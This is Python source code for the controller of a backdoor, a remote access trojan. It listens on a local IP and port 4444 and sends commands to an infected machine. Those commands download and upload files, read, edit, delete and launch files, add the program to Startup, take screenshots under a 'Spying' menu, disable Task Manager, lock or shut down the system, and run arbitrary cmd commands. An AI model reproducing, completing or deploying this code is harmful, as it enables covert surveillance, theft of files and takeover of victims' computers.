import os
import json
import socket
import base64
import work_manager as wm
from datetime import datetime

class server_backdoor:
    work_manager = wm.manager()
    list_of_argument_commands = ["download", "edit", "upload", "launch", "del", "read", "psound", "sdmsg", "cgstate"]

    def __init__(self, ip, port):
        try:
            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind((ip, port))
            listener.listen(0)

            print("[+] Waiting for connections.")
            self.connection, address = listener.accept()
            print("[+] Got a connection from {}".format(address))
        except socket.error() as e:
            print("Error connecting: {}".format(e))

    def reliable_send(self, data):
        try:
            json_data = json.dumps(data)
            self.connection.send(json_data.encode())
        except Exception as e:
            return "[-] (Server) Couldn't send the data, {}.".format(e)

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
            except Exception as e:
                return "[-] (Server) Couldn't receive the data, {}.".format(e)

    def execute_remotely(self, command):
        try:
            self.reliable_send(command)    
            if command[0] == "exit" or self.is_a_shutdown_type(command):
                self.connection.close()
                exit()
    
            return self.reliable_receive()
        except Exception as e:
            return "[-] (Server) Couldn't send/receive the data: {}.".format(e)

    def is_a_shutdown_type(self, command):
        return (command[0] == "cgstate" and command[1] == "2") or (command[0] == "cgstate" and command[1] == "3")

    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
                return "[+] Download successful."            
        except Exception as e:
            return "[-] (Server) Couldn't write to: {}, {}.".format(path, e)

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode()
        except Exception as e:
            return "[-] (Server) Couldn't extract data from: {}, {}.".format(path, e)

    def take_screenshot(self, data):
        try:            
            time = datetime.now()
            file_name = "{}-{}-{}-{}-{}.png".format(time.day, time.month, time.hour, time.minute, time.second)
            
            self.write_file(os.getcwd() + "\\" + file_name, data)            
            return "[+] Successfully managed to downlaod and save the screenshot."
        except Exception as e:
            return "[-] Error during download of the screenshot: {}.".format(e)

    def help_menu(self):
        print("\nCore Commands\n=============\n")
        print("Command\t\tDescription\n-------\t\t-----------")
        print("{}\t\t{}".format("help", "Show help menu."))
        print("{}\t{}".format("download path", "Download a file (to the project's directory)."))
        print("{}\t{}".format("upload -p path -t target", "Upload a file."))
        print("{}\t\t{}".format("startup", "Add the program to Startup."))
        print("{}\t{}".format("rmstartup", "Remove the program from Startup."))
        print("{}\t\t{}".format("exit", "Exit the program."))

        print("\nFile Commands\n=============\n")
        print("Command\t\tDescription\n-------\t\t-----------")
        print("{}\t{}".format("launch path", "Launch a file."))
        print("{}\t{}".format("del path", "Delete a file/folder."))
        print("{}\t{}".format("read path", "Read a file's content."))
        print("{}\t{}".format("edit 1 path", "Delete the content of the file."))
        print("{}\t{}".format("edit 2 path", "Add text to file."))
        print("{}\t{}".format("psound path", "Play a sound."))
        print("{}\t\t{}".format("stsound", "Stop the playing sound."))

        print("\nSpying\n======\n")
        print("Command\t\tDescription\n-------\t\t-----------")
        print("{}\t{}".format("screenshot", "Take a screenshot."))
        print("{}\t\t{}".format("idle", "Get idle time."))
        print("{}\t\t{}".format("info", "Get Info about the user."))
        
        print("\nOther Commands\n=============\n")
        print("Command\t\tDescription\n-------\t\t-----------")
        print("{}\t\t{}".format("ps", "Display all the processes running."))
        print("{}\t{}".format("sdmsg msg", "Send a message to the user."))
        print("{}\t{}".format("tsmanager", "Disable/Enable the Task Manager."))
        print("{}\t{}".format("cgstate 1", "Lock the system."))
        print("{}\t{}".format("cgstate 2", "Restart the system."))
        print("{}\t{}".format("cgstate 3", "Shut down the system."))
        print("\nYou can execute any cmd command.\n")

    def is_valid(self, cmd_0, rest_of_command):
        for i in self.list_of_argument_commands:
            if cmd_0 == i:
                if len(rest_of_command) == 0:
                    return False
        
        return True 

    def run(self):
        self.help_menu()
        while True:
            command = input(">> ")
            command = command.split(" ")
            command_0 = command[0].lower()
            
            try:
                rest_of_command = " ".join(command[1:])
                if self.is_valid(command_0, rest_of_command):
                    if command_0 == "help":
                        self.help_menu()
                        continue
                    elif command_0 == "upload":                        
                        p_index = command.index("-p")
                        t_index = command.index("-t")
                        file_path = " ".join(command[p_index + 1: t_index])     #Getting the file we want to upload location

                        file_content = self.read_file(file_path)
                        command.append(file_content)
                    elif command_0 == "edit":
                        if command[1] == "2":                       
                            data = ""
                            while True:
                                txt = input("Enter what to add to the file: (S to stop): ")
                                if txt.lower() == "s":
                                    break

                                data += "\n" + txt

                            command.append(data)
                    
                    result = self.execute_remotely(command)
                    if command_0 == "download" and "[-]" not in result and rest_of_command != "":
                        path = os.getcwd() + "\\" + rest_of_command
                        result = self.write_file(path, result)
                    elif command_0 == "screenshot" and "[-]" not in result:
                        result = self.take_screenshot(result)
                else:
                    result = "You wrote incorrectly the command, for help write help."                    
            except Exception as e:
                result = "\n[-] (Server) Error during command execution: {}.".format(e)
 
            print(result)

server = server_backdoor("192.168.1.112", 4444)
server.run()